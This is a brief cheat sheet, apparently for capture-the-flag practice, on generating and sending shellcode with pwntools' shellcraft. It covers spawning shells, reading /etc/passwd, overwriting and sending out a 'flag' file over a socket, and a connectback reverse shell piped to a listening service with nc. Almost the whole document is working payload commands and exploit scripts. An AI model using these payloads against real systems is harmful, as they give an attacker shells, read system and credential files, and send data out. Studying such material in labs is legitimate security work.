## Shellcodes with pwntools

```
arch = [ 'linux', 'amd64', 'arm' ]

shell = 'sh', 'dupsh'
io    = 'cat', 'write_file', 'ls', 'sendfile'
nw    = 'connectback'
```


### sh 
* tested on i386, amd64, ARM

``shellcraft -c i386 sh -f r | strace -ifx demo32 -``

### dupsh
* tested on i386, amd64, ARM

``shellcraft -c i386 dupsh 1 -f r | strace -ifx demo32 -``

### cat
* tested on i386, amd64, ARM

``shellcraft -c i386 cat /etc/passwd  -f r | strace -ifx demo32 -``

### write_file = open_file + write_file 
* tested on i386, amd64, ARM

```python
s = 'this file has been overwritted by me'

sc = ''
sc += asm(shellcode.open_file('./flag', 0x2))
sc += asm(shellcode.write_file(3, s, len(s)))
```

### ls
* tested on i386, ARM
* have to write shellcode in amd64

``shellcraft -c i386 ls /etc -f r | demo32 -``

```python
sc += asm(shellcode.ls('/etc/', out_fd=4))

s = remote('localhost', 31337)
s.send(sc + '\n')
while 1:
    rv = s.recv(1540)
    if len(rv) == 0:
        break
    print parse_getdents(rv)
```

### sendfile = open_file + sendfile
* tested on i386, amd64, ARM

```python
#!python

from pwn import *
context('i386', 'linux')

HOST = 'localhost'
PORT = 31337

s = remote(HOST, PORT)

sc = ''
sc += asm(shellcode.open_file('./flag'))
sc += asm(shellcode.sendfile(in_fd=3, out_fd=4))

s.send(sc + '\n')
print s.recvall()
```

### connectback
* tested on i386, thumb
* amd64(unstable)
* arm - arm_to_thumb() + connectback() 

``shellcraft -c i386 connectback localhost 31338 3 -f r | nc localhost 31337``
